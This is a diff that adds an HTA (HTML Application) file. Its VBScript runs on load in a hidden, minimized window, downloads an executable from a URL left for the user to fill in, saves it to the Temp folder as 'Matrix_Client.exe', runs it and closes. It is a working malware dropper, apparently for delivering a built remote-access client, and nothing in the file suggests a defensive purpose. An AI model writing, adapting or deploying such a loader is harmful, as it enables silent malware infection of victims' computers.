@@ -1,0 +1,24 @@
+<html>
+<head>
+<hta:application id="oHTA" windowstate="minimize" showintaskbar="no" scroll="no" border="none" />
+<script language="vbscript">
+    Sub Window_OnLoad
+        ' Link direto para o seu Client-built.exe
+        urlExe = "COLOQUE_AQUI_O_LINK_DO_SEU_EXE"
+        
+        caminho = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%\Matrix_Client.exe")
+        Set xml = CreateObject("MSXML2.XMLHTTP")
+        xml.Open "GET", urlExe, False
+        xml.Send
+        
+        Set stream = CreateObject("ADODB.Stream")
+        stream.Type = 1: stream.Open: stream.Write xml.ResponseBody
+        stream.SaveToFile caminho, 2: stream.Close
+        
+        CreateObject("WScript.Shell").Run caminho, 1
+        window.close
+    End Sub
+</script>
+</head>
+<body></body>
+</html>
